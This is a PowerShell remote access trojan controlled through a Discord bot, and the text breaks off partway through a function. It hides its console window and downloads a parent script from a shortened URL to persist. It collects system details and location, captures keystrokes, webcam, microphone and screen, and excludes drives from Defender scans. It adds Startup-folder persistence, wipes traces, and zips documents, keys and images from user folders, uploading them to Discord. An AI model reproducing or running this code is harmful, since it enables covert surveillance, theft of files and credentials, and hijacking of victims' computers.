
# =====================================================================================================================================================
<#
**SETUP**
-SETUP THE BOT
1. make a discord bot at https://discord.com/developers/applications/
2. Enable all Privileged Gateway Intents on 'Bot' page
3. On OAuth2 page, tick 'Bot' in Scopes section
4. In Bot Permissions section tick Manage Channels, Read Messages/View Channels, Attach Files, Read Message History.
5. Copy the URL into a browser and add the bot to your server.
6. On 'Bot' page click 'Reset Token' and copy the token.

-SETUP THE SCRIPT
1. Copy the token into the script directly below.

**INFORMATION**
- The Discord bot you use must be in one server ONLY
-------------------------------------------------------------------------------------------------
#>
# =====================================================================================================================================================
$global:token = "$tk" # make sure your bot is in ONE server only
# =============================================================== SCRIPT SETUP =========================================================================

$HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
$spawnChannels = 1 # Create new channel on session start
$InfoOnConnect = 1 # Generate client info message on session start
$defaultstart = 1 # Option to start all jobs automatically upon running
$parent = "https://is.gd/bwdcc2" # parent script URL (for restarts and persistance)

# remove restart stager (if present)
if(Test-Path "C:\Windows\Tasks\service.vbs"){
    $InfoOnConnect = 0
    rm -path "C:\Windows\Tasks\service.vbs" -Force
}
$version = "1.5.1" # Check version number
$response = $null
$previouscmd = $null
$authenticated = 0
$timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"

# =============================================================== MODULE FUNCTIONS =========================================================================
# Download ffmpeg.exe function (dependency for media capture) 
Function GetFfmpeg{
    sendMsg -Message ":hourglass: ``Downloading FFmpeg to Client.. Please Wait`` :hourglass:"
    $Path = "$env:Temp\ffmpeg.exe"
    $tempDir = "$env:temp"
    If (!(Test-Path $Path)){  
        $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
        $wc = New-Object System.Net.WebClient           
        $wc.Headers.Add("User-Agent", "PowerShell")
        $response = $wc.DownloadString("$apiUrl")
        $release = $response | ConvertFrom-Json
        $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
        $zipUrl = $asset.browser_download_url
        $zipFilePath = Join-Path $tempDir $asset.name
        $extractedDir = Join-Path $tempDir ($asset.name -replace '.zip$', '')
        $wc.DownloadFile($zipUrl, $zipFilePath)
        Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
        Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
        rm -Path $zipFilePath -Force
        rm -Path $extractedDir -Recurse -Force
    }
}

# Create a new category for text channels function
Function NewChannelCategory{
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $guildID = $null
    while (!($guildID)){    
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)    
        $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
        $guilds = $response | ConvertFrom-Json
        foreach ($guild in $guilds) {
            $guildID = $guild.id
        }
        sleep 3
    }
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
    $body = @{
        "name" = "$env:COMPUTERNAME"
        "type" = 4
    } | ConvertTo-Json    
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")
    $wc.Headers.Add("Content-Type", "application/json")
    $response = $wc.UploadString($uri, "POST", $body)
    $responseObj = ConvertFrom-Json $response
    Write-Host "The ID of the new category is: $($responseObj.id)"
    $global:CategoryID = $responseObj.id
}

# Create a new channel function
Function NewChannel{
param([string]$name)
    $headers = @{
        'Authorization' = "Bot $token"
    }    
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)    
    $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
    $guilds = $response | ConvertFrom-Json
    foreach ($guild in $guilds) {
        $guildID = $guild.id
    }
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
    $body = @{
        "name" = "$name"
        "type" = 0
        "parent_id" = $CategoryID
    } | ConvertTo-Json    
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")
    $wc.Headers.Add("Content-Type", "application/json")
    $response = $wc.UploadString($uri, "POST", $body)
    $responseObj = ConvertFrom-Json $response
    Write-Host "The ID of the new channel is: $($responseObj.id)"
    $global:ChannelID = $responseObj.id
}

# Send a message or embed to discord channel function
function sendMsg {
    param([string]$Message,[string]$Embed)

    $url = "https://discord.com/api/v10/channels/$SessionID/messages"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")

    if ($Embed) {
        $jsonBody = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
        $wc.Headers.Add("Content-Type", "application/json")
        $response = $wc.UploadString($url, "POST", $jsonBody)
        if ($webhook){
            $body = @{"username" = "Scam BOT" ;"content" = "$jsonBody"} | ConvertTo-Json
            IRM -Uri $webhook -Method Post -ContentType "application/json" -Body $jsonBody
        }
        $jsonPayload = $null
    }
    if ($Message) {
            $jsonBody = @{
                "content" = "$Message"
                "username" = "$env:computername"
            } | ConvertTo-Json
            $wc.Headers.Add("Content-Type", "application/json")
            $response = $wc.UploadString($url, "POST", $jsonBody)
	        $message = $null
    }
}

function sendFile {
    param([string]$sendfilePath)

    $url = "https://discord.com/api/v10/channels/$SessionID/messages"
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Authorization", "Bot $token")
    if ($sendfilePath) {
        if (Test-Path $sendfilePath -PathType Leaf) {
            $response = $webClient.UploadFile($url, "POST", $sendfilePath)
            Write-Host "Attachment sent to Discord: $sendfilePath"
        } else {
            Write-Host "File not found: $sendfilePath"
        }
    }
}

# Gather System and user information
Function quickInfo{
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Device
    $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
    $GeoWatcher.Start()
    while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {Sleep -M 100}  
    if ($GeoWatcher.Permission -eq 'Denied'){$GPS = "Location Services Off"}
    else{
        $GL = $GeoWatcher.Position.Location | Select Latitude,Longitude;$GL = $GL -split " "
    	$Lat = $GL[0].Substring(11) -replace ".$";$Lon = $GL[1].Substring(10) -replace ".$"
        $GPS = "LAT = $Lat LONG = $Lon"
    }
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
        $adminperm = "False"
    } else {
        $adminperm = "True"
    }
    $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
    $userInfo = Get-WmiObject -Class Win32_UserAccount
    $processorInfo = Get-WmiObject -Class Win32_Processor
    $computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
    $userInfo = Get-WmiObject -Class Win32_UserAccount
    $videocardinfo = Get-WmiObject Win32_VideoController
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;$Width = $Screen.Width;$Height = $Screen.Height;$screensize = "${width} x ${height}"
    $email = (Get-ComputerInfo).WindowsRegisteredOwner
    $OSString = "$($systemInfo.Caption)"
    $OSArch = "$($systemInfo.OSArchitecture)"
    $RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
    $processor = "$($processorInfo.Name)"
    $gpu = "$($videocardinfo.Name)"
    $ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
    $systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
    $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
    $script:jsonPayload = @{
        username   = $env:COMPUTERNAME
        tts        = $false
        embeds     = @(
            @{
                title       = "$env:COMPUTERNAME | Computer Information "
                "description" = @"
``````SYSTEM INFORMATION FOR $env:COMPUTERNAME``````
:man_detective: **User Information** :man_detective:
- **Current User**          : ``$env:USERNAME``
- **Email Address**         : ``$email``
- **Language**              : ``$systemLanguage``
- **Administrator Session** : ``$adminperm``

:minidisc: **OS Information** :minidisc:
- **Current OS**            : ``$OSString - $ver``
- **Architechture**         : ``$OSArch``

:globe_with_meridians: **Network Information** :globe_with_meridians:
- **Public IP Address**     : ``$computerPubIP``
- **Location Information**  : ``$GPS``

:desktop: **Hardware Information** :desktop:
- **Processor**             : ``$processor`` 
- **Memory**                : ``$RamInfo``
- **Gpu**                   : ``$gpu``
- **Screen Size**           : ``$screensize``

``````COMMAND LIST``````
- **Options**               : Show The Options Menu
- **ExtraInfo**             : Show The Extra Info Menu
- **Close**                 : Close this session

"@
                color       = 65280
            }
        )
    }
    sendMsg -Embed $jsonPayload -webhook $webhook
}

# Hide powershell console window function
function HideWindow {
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    if($hwnd -ne [System.IntPtr]::Zero){
        $Type::ShowWindowAsync($hwnd, 0)
    }
    else{
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

# --------------------------------------------------------------- HELP FUNCTIONS ------------------------------------------------------------------------

Function Options {
$script:jsonPayload = @{
    username   = $env:COMPUTERNAME
    tts        = $false
    embeds     = @(
        @{
            title       = "$env:COMPUTERNAME | Commands List "
            "description" = @"

### SYSTEM
- **AddPersistance**: Add this script to startup.
- **RemovePersistance**: Remove Poshcord from startup
- **IsAdmin**: Check if the session is admin
- **Elevate**: Attempt to restart script as admin (!user popup!)
- **ExcludeCDrive**: Exclude C:/ Drive from all Defender Scans
- **ExcludeAllDrives**: Exclude C:/ - G:/ Drives from Defender Scans
- **EnableIO**: Enable Keyboard and Mouse (admin only)
- **DisableIO**: Disable Keyboard and Mouse (admin only)
- **Exfiltrate**: Send various files. (see ExtraInfo)
- **Upload**: Upload a file. (see ExtraInfo)
- **Download**: Download a file. (attach a file with the command)
- **StartUvnc**: Start UVNC client `StartUvnc -ip 192.168.1.1 -port 8080`
- **SpeechToText**: Send audio transcript to Discord
- **EnumerateLAN**: Show devices on LAN (see ExtraInfo)
- **NearbyWifi**: Show nearby wifi networks (!user popup!)
- **RecordScreen**: Record Screen and send to Discord

### PRANKS
- **FakeUpdate**: Spoof Windows-10 update screen using Chrome
- **Windows93**: Start parody Windows93 using Chrome
- **WindowsIdiot**: Start fake Windows95 using Chrome
- **SendHydra**: Never ending popups (use killswitch) to stop
- **SoundSpam**: Play all Windows default sounds on the target
- **Message**: Send a message window to the User (!user popup!)
- **VoiceMessage**: Send a message window to the User (!user popup!)
- **MinimizeAll**: Send a voice message to the User
- **EnableDarkMode**: Enable System wide Dark Mode
- **DisableDarkMode**: Disable System wide Dark Mode
- **ShortcutBomb**: Create 50 shortcuts on the desktop.
- **Wallpaper**: Set the wallpaper (wallpaper -url http://img.com/f4wc)
- **Goose**: Spawn an annoying goose (Sam Pearson App)
- **ScreenParty**: Start A Disco on screen!

### JOBS
- **Microphone**: Record microphone clips and send to Discord
- **Webcam**: Stream webcam pictures to Discord
- **Screenshots**: Sends screenshots of the desktop to Discord
- **Keycapture**: Capture Keystrokes and send to Discord
- **SystemInfo**: Gather System Info and send to Discord

### CONTROL
- **ExtraInfo**: Get a list of further info and command examples
- **Cleanup**: Wipe history (run prompt, powershell, recycle bin, Temp)
- **Kill**: Stop a running module (eg. Exfiltrate)
- **PauseJobs**: Pause the current jobs for this session
- **Close**: Close this session
"@
            color       = 65280
        }
    )
}
sendMsg -Embed $jsonPayload
}

Function ExtraInfo {
$script:jsonPayload = @{
    username   = $env:COMPUTERNAME
    tts        = $false
    embeds     = @(
        @{
            title       = "$env:COMPUTERNAME | Extra Information "
            "description" = @"
``````Example Commands``````

**Default PS Commands:**
> PS> ``whoami`` (Returns Powershell commands)

**Exfiltrate Command Examples:**
> PS> ``Exfiltrate -Path Documents -Filetype png``
> PS> ``Exfiltrate -Filetype log``
> PS> ``Exfiltrate``
Exfiltrate only will send many pre-defined filetypes
from all User Folders like Documents, Downloads etc..

**Upload Command Example:**
> PS> ``Upload -Path C:/Path/To/File.txt``
Use 'FolderTree' command to show all files

**Enumerate-LAN Example:**
> PS> ``EnumerateLAN -Prefix 192.168.1.``
This Eg. will scan 192.168.1.1 to 192.168.1.254

**Prank Examples:**
> PS> ``Message 'Your Message Here!'``
> PS> ``VoiceMessage 'Your Message Here!'``
> PS> ``wallpaper -url http://img.com/f4wc``

**Record Examples:**
> PS> ``RecordScreen -t 100`` (number of seconds to record)

**Kill Command modules:**
- Exfiltrate
- SendHydra
- SpeechToText
"@
            color       = 65280
        }
    )
}
sendMsg -Embed $jsonPayload
}

Function CleanUp { 
    Remove-Item $env:temp\* -r -Force -ErrorAction SilentlyContinue
    Remove-Item (Get-PSreadlineOption).HistorySavePath
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue

    $campath = "$env:Temp\Image.jpg"
    $screenpath = "$env:Temp\Screen.jpg"
    $micpath = "$env:Temp\Audio.mp3"
    If (Test-Path $campath){  
        rm -Path $campath -Force
    }
    If (Test-Path $screenpath){  
        rm -Path $screenpath -Force
    }
    If (Test-Path $micpath){  
        rm -Path $micpath -Force
    }

    sendMsg -Message ":white_check_mark: ``Clean Up Task Complete`` :white_check_mark:"
}

# --------------------------------------------------------------- INFO FUNCTIONS ------------------------------------------------------------------------
Function EnumerateLAN{
param ([string]$Prefix)
    if ($Prefix.Length -eq 0){Write-Output "Use -prefix to define the first 3 parts of an IP Address eg. Enumerate-LAN -prefix 192.168.1";sleep 1 ;return}
    $FileOut = "$env:temp\Computers.csv"
    1..255 | ForEach-Object {
        $ipAddress = "$Prefix.$_"
        Start-Process -WindowStyle Hidden ping.exe -ArgumentList "-n 1 -l 0 -f -i 2 -w 100 -4 $ipAddress"
        }
    $Computers = (arp.exe -a | Select-String "$Prefix.*dynam") -replace ' +', ',' |
                 ConvertFrom-Csv -Header Computername, IPv4, MAC, x, Vendor |
                 Select-Object IPv4, MAC
    $Computers | Export-Csv $FileOut -NoTypeInformation
    $data = Import-Csv $FileOut
    $data | ForEach-Object {
        $mac = $_.'MAC'
        $apiUrl = "https://api.macvendors.com/$mac"
        $manufacturer = (Invoke-RestMethod -Uri $apiUrl).Trim()
        Start-Sleep -Seconds 1
        $_ | Add-Member -MemberType NoteProperty -Name "manufacturer" -Value $manufacturer -Force
        }
    $data | Export-Csv $FileOut -NoTypeInformation
    $data | ForEach-Object {
        try {
            $ip = $_.'IPv4'
            $hostname = ([System.Net.Dns]::GetHostEntry($ip)).HostName
            $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $hostname -Force
        } 
        catch {
            $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value "Error: $($_.Exception.Message)"  
        }
    }
    $data | Export-Csv $FileOut -NoTypeInformation
    $results = Get-Content -Path $FileOut -Raw
    sendMsg -Message "``````$results``````"
    rm -Path $FileOut
}

Function NearbyWifi {
    $showNetworks = explorer.exe ms-availablenetworks:
    sleep 4
    $wshell = New-Object -ComObject wscript.shell
    $wshell.AppActivate('explorer.exe')
    $tab = 0
    while ($tab -lt 6){
        $wshell.SendKeys('{TAB}')
        sleep -m 100
        $tab++
    }
    $wshell.SendKeys('{ENTER}')
    sleep -m 200
    $wshell.SendKeys('{TAB}')
    sleep -m 200
    $wshell.SendKeys('{ESC}')
    $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
    $Wifi = ($NearbyWifi|Out-String)
    sendMsg -Message "``````$Wifi``````"
}

# --------------------------------------------------------------- PRANK FUNCTIONS ------------------------------------------------------------------------

Function FakeUpdate {
    $tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "chrome.exe --new-window -kiosk https://fakeupdate.net/win8", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
    $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
    $tobat | Out-File -FilePath $pth -Force
    sleep 1
    Start-Process -FilePath $pth
    sleep 3
    Remove-Item -Path $pth -Force
    sendMsg -Message ":arrows_counterclockwise: ``Fake-Update Sent..`` :arrows_counterclockwise:"
}

Function Windows93 {
    $tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "chrome.exe --new-window -kiosk https://windows93.net", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
    $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
    $tobat | Out-File -FilePath $pth -Force
    sleep 1
    Start-Process -FilePath $pth
    sleep 3
    Remove-Item -Path $pth -Force
    sendMsg -Message ":arrows_counterclockwise: ``Windows 93 Sent..`` :arrows_counterclockwise:"
}

Function WindowsIdiot {
    $tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "chrome.exe --new-window -kiosk https://ygev.github.io/Trojan.JS.YouAreAnIdiot", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
    $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
    $tobat | Out-File -FilePath $pth -Force
    sleep 1
    Start-Process -FilePath $pth
    sleep 3
    Remove-Item -Path $pth -Force
    sendMsg -Message ":arrows_counterclockwise: ``Windows Idiot Sent..`` :arrows_counterclockwise:"
}

Function SendHydra {
    Add-Type -AssemblyName System.Windows.Forms
    sendMsg -Message ":arrows_counterclockwise: ``Hydra Sent..`` :arrows_counterclockwise:"
    function Create-Form {
        $form = New-Object Windows.Forms.Form;$form.Text = "  __--** YOU HAVE BEEN INFECTED BY HYDRA **--__ ";$form.Font = 'Microsoft Sans Serif,12,style=Bold';$form.Size = New-Object Drawing.Size(300, 170);$form.StartPosition = 'Manual';$form.BackColor = [System.Drawing.Color]::Black;$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog;$form.ControlBox = $false;$form.Font = 'Microsoft Sans Serif,12,style=bold';$form.ForeColor = "#FF0000"
        $Text = New-Object Windows.Forms.Label;$Text.Text = "Cut The Head Off The Snake..`n`n    ..Two More Will Appear";$Text.Font = 'Microsoft Sans Serif,14';$Text.AutoSize = $true;$Text.Location = New-Object System.Drawing.Point(15, 20)
        $Close = New-Object Windows.Forms.Button;$Close.Text = "Close?";$Close.Width = 120;$Close.Height = 35;$Close.BackColor = [System.Drawing.Color]::White;$Close.ForeColor = [System.Drawing.Color]::Black;$Close.DialogResult = [System.Windows.Forms.DialogResult]::OK;$Close.Location = New-Object System.Drawing.Point(85, 100);$Close.Font = 'Microsoft Sans Serif,12,style=Bold'
        $form.Controls.AddRange(@($Text, $Close));return $form
    }
    while ($true) {
        $form = Create-Form
        $form.StartPosition = 'Manual'
        $form.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
        $result = $form.ShowDialog()
    
        $messages = PullMsg
        if ($messages -match "kill") {
            sendMsg -Message ":octagonal_sign: ``Hydra Stopped`` :octagonal_sign:"
            $previouscmd = $response
            break
        }
        if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
            $form2 = Create-Form
            $form2.StartPosition = 'Manual'
            $form2.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
            $form2.Show()
        }
        $random = (Get-Random -Minimum 0 -Maximum 2)
        Sleep $random
    }
}

Function Message([string]$Message){
    msg.exe * $Message
    sendMsg -Message ":arrows_counterclockwise: ``Message Sent to User..`` :arrows_counterclockwise:"
}

Function SoundSpam {
    param([Parameter()][int]$Interval = 3)
    sendMsg -Message ":white_check_mark: ``Spamming Sounds... Please wait..`` :white_check_mark:"
    Get-ChildItem C:\Windows\Media\ -File -Filter *.wav | Select-Object -ExpandProperty Name | Foreach-Object { Start-Sleep -Seconds $Interval; (New-Object Media.SoundPlayer "C:\WINDOWS\Media\$_").Play(); }
    sendMsg -Message ":white_check_mark: ``Sound Spam Complete!`` :white_check_mark:"
}

Function VoiceMessage([string]$Message){
    Add-Type -AssemblyName System.speech
    $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $SpeechSynth.Speak($Message)
    sendMsg -Message ":white_check_mark: ``Message Sent!`` :white_check_mark:"
}

Function MinimizeAll{
    $apps = New-Object -ComObject Shell.Application
    $apps.MinimizeAll()
    sendMsg -Message ":white_check_mark: ``Apps Minimised`` :white_check_mark:"
}

Function EnableDarkMode {
    $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
    Set-ItemProperty $Theme AppsUseLightTheme -Value 0
    Set-ItemProperty $Theme SystemUsesLightTheme -Value 0
    Start-Sleep 1
    sendMsg -Message ":white_check_mark: ``Dark Mode Enabled`` :white_check_mark:"
}

Function DisableDarkMode {
    $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
    Set-ItemProperty $Theme AppsUseLightTheme -Value 1
    Set-ItemProperty $Theme SystemUsesLightTheme -Value 1
    Start-Sleep 1
    sendMsg -Message ":octagonal_sign: ``Dark Mode Disabled`` :octagonal_sign:"
}

Function ShortcutBomb {
    $n = 0
    while($n -lt 50) {
        $num = Get-Random
        $AppLocation = "C:\Windows\System32\rundll32.exe"
        $WshShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut("$Home\Desktop\USB Hardware" + $num + ".lnk")
        $Shortcut.TargetPath = $AppLocation
        $Shortcut.Arguments ="shell32.dll,Control_RunDLL hotplug.dll"
        $Shortcut.IconLocation = "hotplug.dll,0"
        $Shortcut.Description ="Device Removal"
        $Shortcut.WorkingDirectory ="C:\Windows\System32"
        $Shortcut.Save()
        Start-Sleep 0.2
        $n++
    }
    sendMsg -Message ":white_check_mark: ``Shortcuts Created!`` :white_check_mark:"
}

Function Wallpaper {
param ([string[]]$url)
    $outputPath = "$env:temp\img.jpg";$wallpaperStyle = 2;IWR -Uri $url -OutFile $outputPath
    $signature = 'using System;using System.Runtime.InteropServices;public class Wallpaper {[DllImport("user32.dll", CharSet = CharSet.Auto)]public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);}'
    Add-Type -TypeDefinition $signature;$SPI_SETDESKWALLPAPER = 0x0014;$SPIF_UPDATEINIFILE = 0x01;$SPIF_SENDCHANGE = 0x02;[Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $outputPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
    sendMsg -Message ":white_check_mark: ``New Wallpaper Set`` :white_check_mark:"
}

Function Goose {
    $url = "https://github.com/beigeworm/assets/raw/main/Goose.zip"
    $tempFolder = $env:TMP
    $zipFile = Join-Path -Path $tempFolder -ChildPath "Goose.zip"
    $extractPath = Join-Path -Path $tempFolder -ChildPath "Goose"
    Invoke-WebRequest -Uri $url -OutFile $zipFile
    Expand-Archive -Path $zipFile -DestinationPath $extractPath
    $vbscript = "$extractPath\Goose.vbs"
    & $vbscript
    sendMsg -Message ":white_check_mark: ``Goose Spawned!`` :white_check_mark:"    
}

Function ScreenParty {
    Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C Add-Type -AssemblyName System.Windows.Forms;`$d = 10;`$i = 100;`$1 = 'Black';`$2 = 'Green';`$3 = 'Red';`$4 = 'Yellow';`$5 = 'Blue';`$6 = 'white';`$st = Get-Date;while ((Get-Date) -lt `$st.AddSeconds(`$d)) {`$t = 1;while (`$t -lt 7){`$f = New-Object System.Windows.Forms.Form;`$f.BackColor = `$c;`$f.FormBorderStyle = 'None';`$f.WindowState = 'Maximized';`$f.TopMost = `$true;if (`$t -eq 1) {`$c = `$1}if (`$t -eq 2) {`$c = `$2}if (`$t -eq 3) {`$c = `$3}if (`$t -eq 4) {`$c = `$4}if (`$t -eq 5) {`$c = `$5}if (`$t -eq 6) {`$c = `$6}`$f.BackColor = `$c;`$f.Show();Start-Sleep -Milliseconds `$i;`$f.Close();`$t++}}")
    sendMsg -Message ":white_check_mark: ``Screen Party Started!`` :white_check_mark:"  
}

# --------------------------------------------------------------- PERSISTANCE FUNCTIONS ------------------------------------------------------------------------

Function AddPersistance{
    $newScriptPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
    $scriptContent | Out-File -FilePath $newScriptPath -force
    sleep 1
    if ($newScriptPath.Length -lt 100){
        "`$tk = `"$token`"" | Out-File -FilePath $newScriptPath -Force -Append
        "`$ch = `"$chan`"" | Out-File -FilePath $newScriptPath -Force -Append
        i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
        sleep 1
        Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
        }
    $tobat = @'
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\Themes\copy.ps1""", 0, True
'@
    $pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
    $tobat | Out-File -FilePath $pth -Force
    rm -path "$env:TEMP\temp.ps1" -Force
    sendMsg -Message ":white_check_mark: ``Persistance Added!`` :white_check_mark:"
}

Function RemovePersistance{
    rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
    rm -Path "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
    sendMsg -Message ":octagonal_sign: ``Persistance Removed!`` :octagonal_sign:"
}

# --------------------------------------------------------------- USER FUNCTIONS ------------------------------------------------------------------------

Function Exfiltrate {
    param ([string[]]$FileType,[string[]]$Path)
    sendMsg -Message ":file_folder: ``Exfiltration Started..`` :file_folder:"
    $maxZipFileSize = 25MB
    $currentZipSize = 0
    $index = 1
    $zipFilePath ="$env:temp/Loot$index.zip"
    If($Path -ne $null){
        $foldersToSearch = "$env:USERPROFILE\"+$Path
    }else{
        $foldersToSearch = @("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")
    }
    If($FileType -ne $null){
        $fileExtensions = "*."+$FileType
    }else {
        $fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
    }
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
    foreach ($folder in $foldersToSearch) {
        foreach ($extension in $fileExtensions) {
            $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
            foreach ($file in $files) {
                $fileSize = $file.Length
                if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                    $zipArchive.Dispose()
                    $currentZipSize = 0
                    sendFile -sendfilePath $zipFilePath | Out-Null
                    Sleep 1
                    Remove-Item -Path $zipFilePath -Force
                    $index++
                    $zipFilePath ="$env:temp/Loot$index.zip"
                    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
                }
                $entryName = $file.FullName.Substring($folder.Length + 1)
                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
                $currentZipSize += $fileSize
                PullMsg
                if ($response -like "kill") {
                    sendMsg -Message ":file_folder: ``Exfiltration Stopped`` :octagonal_sign:"
                    $script:previouscmd = $response
                    break
                }
            }
        }
    }
    $zipArchive.Dispose()
    sendFile -sendfilePath $zipFilePath | Out-Null
    sleep 5
    Remove-Item -Path $zipFilePath -Force
}

Function Upload{
param ([string[]]$Path)
    if (Test-Path -Path $path){
        $extension = [System.IO.Path]::GetExtension($path)
        if ($extension -eq ".exe" -or $extension -eq ".msi") {
            $tempZipFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetFileName($path))
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $tempZipFilePath)
            curl.exe -F file1=@"$tempZipFilePath" $hookurl | Out-Null
            sleep 1
            Rm -Path $tempZipFilePath -Recurse -Force
        }else{
            sendFile -sendfilePath $Path | Out-Null
        }
    }
}

Function SpeechToText {
    Add-Type -AssemblyName System.Speech
    $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
    $grammar = New-Object System.Speech.Recognition.DictationGrammar
    $speech.LoadGrammar($grammar)
    $speech.SetInputToDefaultAudioDevice()
    
    while ($true) {
        $result = $speech.Recognize()
        if ($result) {
            $results = $result.Text
            Write-Output $results
            sendMsg -Message "``````$results``````"
        }
        PullMsg
        if ($response -like "kill") {
	$script:previouscmd = $response
        break
        }
    }
}

Function StartUvnc{
    param([string]$ip,[string]$port)

    sendMsg -Message ":arrows_counterclockwise: ``Starting UVNC Client..`` :arrows_counterclockwise:"
    $tempFolder = "$env:temp\vnc"
    $vncDownload = "https://github.com/beigeworm/assets/raw/main/winvnc.zip"
    $vncZip = "$tempFolder\winvnc.zip" 
    if (!(Test-Path -Path $tempFolder)) {
        New-Item -ItemType Directory -Path $tempFolder | Out-Null
    }  
    if (!(Test-Path -Path $vncZip)) {
